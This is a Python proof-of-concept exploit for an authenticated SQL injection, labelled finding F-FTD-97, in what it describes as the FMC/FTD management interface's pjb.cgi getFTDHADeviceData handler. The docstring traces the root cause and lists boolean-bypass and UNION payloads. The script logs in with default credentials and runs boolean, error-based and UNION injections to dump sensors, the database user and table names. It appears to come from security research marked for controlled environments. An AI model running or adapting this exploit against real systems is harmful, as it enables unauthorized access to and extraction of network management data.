"""
F-FTD-97: Authenticated SQLi via PJB primary_device_uuid — SensorList.pm:969
CONTROLLED ENVIRONMENT ONLY

Root cause:
  SF/SensorList.pm getFTDHADeviceInfo() concatenates $primary_device_uuid directly
  into a SQL string before $dbh->prepare():

    $sql = $sql . " AND sensor.uid != '" . $primary_device_uuid . "' group by sensor.uid";
    my $sth = $dbh->prepare($sql);
    $sth->execute(@descendent_domains);

  $primary_device_uuid comes from caller via getFTDHADeviceData(@_) in
  SF/UI/PJB/Sensors/List.pm:609, which passes @_ directly from the PJB handler.

  The PJB handler at pjb.cgi:56 extracts parameters from JSON:
    print SF::UI::PJB::handleRequest($function, $q->param('parameters'));
  Then calls: &$code(@$parameters) — first element of JSON array = primary_device_uuid.

Auth requirement:
  POST /pjb.cgi requires a valid session (SF::Auth::CheckLogin) with 'devices' read
  permission. Not pre-auth. Any FMC/FDM user with device read access can trigger.

Injection point:
  POST /pjb.cgi
  function=SF%3A%3AUI%3A%3APJB%3A%3ASensors%3A%3AList%3A%3AgetFTDHADeviceData
  parameters=["<INJECTION>"]

  Base SQL before injection:
    SELECT sensor.uid, sensor.name, ... FROM sensor
    LEFT JOIN license_caps ON (license_caps.mgd_uuid=sensor.uid
      AND license_caps.mgr_uuid='<appliance_uuid>' AND license_caps.active=1)
    WHERE (sensor.active=1 AND sensor.uid IS NOT NULL AND sensor.uid != ''
      AND LOWER(uuid_btoa(sensor.domain_uuid)) IN (?,...))
    AND sensor.uid != '<INJECTION>' group by sensor.uid

  Boolean filter bypass:
    payload: ' OR '1'='1' --
    effect: WHERE condition always true → returns ALL sensors regardless of domain

  UNION exfil (9 columns: uid,name,model,model_type,model_id,model_number,
                           sw_version,sensor_policy_uuid,domain_uuid):
    payload: ' UNION SELECT table_name,table_schema,null,null,null,null,null,null,null
              FROM information_schema.tables --

Severity: MEDIUM
  Authenticated (devices read required); affects FMC management database.
  Column count = 9 (uid,name,model,model_type,model_id,model_number,
                    sw_version,sensor_policy_uuid,domain_uuid via GROUP_CONCAT).
  MySQL; GROUP_CONCAT on domain_uuid complicates UNION column matching.

Confirmed via:
  SF/SensorList.pm:969 (string concat, not prepared statement placeholder)
  SF/UI/PJB/Sensors/List.pm:609 (full @_ passthrough)
  SF/UI/PJB.pm:330 (dispatch table: 'devices' perm)
  SF/UI/PJB.pm:1140 (&$code(@$parameters) — first array element = primary_device_uuid)
  pjb.cgi:56 (handleRequest($function, $q->param('parameters')))
"""

import sys
import json
import requests
import argparse
import urllib3
urllib3.disable_warnings()

FINDING = "F-FTD-97"
LABEL = "FTD PJB SQLi — getFTDHADeviceData primary_device_uuid"
FUNCTION = "SF::UI::PJB::Sensors::List::getFTDHADeviceData"
# CONTROLLED ENVIRONMENT ONLY


def get_session(base_url: str, username: str, password: str) -> requests.Session:
    s = requests.Session()
    s.verify = False
    # FMC/httpsd login endpoint — legacy SF web UI
    resp = s.post(
        f"{base_url}/login.cgi",
        data={"username": username, "password": password, "target": "/index.cgi"},
        allow_redirects=True,
        timeout=15,
    )
    if "logout" not in resp.text.lower() and resp.status_code not in (200, 302):
        raise RuntimeError(f"Login failed: {resp.status_code}")
    return s


def pjb_call(s: requests.Session, base_url: str, payload: str, csrf: str = "") -> dict:
    params = json.dumps([payload])
    resp = s.post(
        f"{base_url}/pjb.cgi",
        data={
            "function": FUNCTION,
            "parameters": params,
            "ss": csrf,
            "am": "",
        },
        verify=False,
        timeout=30,
    )
    try:
        return resp.json()
    except Exception:
        return {"raw": resp.text[:500]}


def probe_boolean_bypass(s: requests.Session, base_url: str, csrf: str) -> None:
    # Boolean test — inject ' OR '1'='1' -- to return all sensors
    payload = "' OR '1'='1' -- "
    result = pjb_call(s, base_url, payload, csrf)
    data = result.get("data", result)
    print(f"[+] Boolean bypass response keys: {list(result.keys())}")
    if isinstance(data, list):
        print(f"[+] Returned {len(data)} sensor rows (all sensors if > expected)")
    else:
        print(f"[.] Response: {str(result)[:300]}")


def probe_error_based(s: requests.Session, base_url: str, csrf: str) -> None:
    # Error-based: EXTRACTVALUE to leak data via MySQL error message
    payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e)) -- "
    result = pjb_call(s, base_url, payload, csrf)
    print(f"[+] Error-based response: {str(result)[:400]}")


def probe_union(s: requests.Session, base_url: str, csrf: str, col_count: int = 9) -> None:
    # UNION-based — attempt to extract table names
    # Base query has GROUP_CONCAT on last col; match with GROUP_CONCAT in UNION
    nulls = ",".join(["null"] * (col_count - 2))
    payload = (
        f"' UNION SELECT table_name,table_schema,{nulls}"
        f" FROM information_schema.tables -- "
    )
    result = pjb_call(s, base_url, payload, csrf)
    print(f"[+] UNION response: {str(result)[:400]}")


def main() -> None:
    ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    ap.add_argument("host", help="Target host (IP or hostname)")
    ap.add_argument("-u", "--user", default="admin")
    ap.add_argument("-p", "--password", default="Admin123")
    ap.add_argument(
        "--mode",
        choices=["probe", "boolean", "error", "union"],
        default="probe",
        help="Exploitation mode",
    )
    ap.add_argument("--csrf", default="", help="CSRF token (ss param) if required")
    ap.add_argument("--port", type=int, default=443)
    args = ap.parse_args()

    base_url = f"https://{args.host}:{args.port}"
    print(f"[*] {FINDING}: {LABEL}")
    print(f"[*] Target: {base_url}")
    print(f"[*] Auth: {args.user} / {args.password}")
    print("[!] CONTROLLED ENVIRONMENT ONLY")

    s = get_session(base_url, args.user, args.password)
    print("[+] Session established")

    if args.mode in ("probe", "boolean"):
        probe_boolean_bypass(s, base_url, args.csrf)
    if args.mode in ("probe", "error"):
        probe_error_based(s, base_url, args.csrf)
    if args.mode in ("probe", "union"):
        probe_union(s, base_url, args.csrf)


if __name__ == "__main__":
    main()
